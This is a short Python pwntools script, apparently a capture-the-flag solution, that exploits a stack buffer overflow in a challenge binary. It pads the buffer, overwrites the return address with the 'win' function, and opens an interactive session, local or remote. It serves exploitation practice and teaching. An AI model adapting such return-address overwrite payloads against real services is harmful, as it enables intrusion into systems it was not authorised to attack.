#!/usr/bin/env python3

from pwn import *

TARGET = './chall'
HOST = ''
PORT = 1337

elf = ELF(TARGET)

context.arch = 'amd64'
gdb_script = f"""
  b *main+40
  b *main+51
  c
"""
# context.log_level = 'DEBUG'

if args.GDB:
  context.terminal = ['wt.exe', '-w', '0', 'new-tab', '--', 'bash', '-lc']
  p = gdb.debug(TARGET, gdbscript=gdb_script)
elif not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

# ===================================== #

ret = 0x4011e5

#         vuln_buf              RBP               RIP
# payload = p64(0xdeadbeef) * 4 + p64(0xcafebabe) + p64(elf.sym.win)  # 0x401195
# payload = p64(0xdeadbeef) * 4 + p64(0xcafebabe) + p64(elf.sym.win + 1)  # 0x401196

payload = p64(0xdeadbeef) * 4 + p64(0xcafebabe) + p64(elf.sym.win)

p.sendlineafter(b'pwnme> ', payload)

p.interactive()

# NOTE:
# Buffer Overflow
# Ret2win
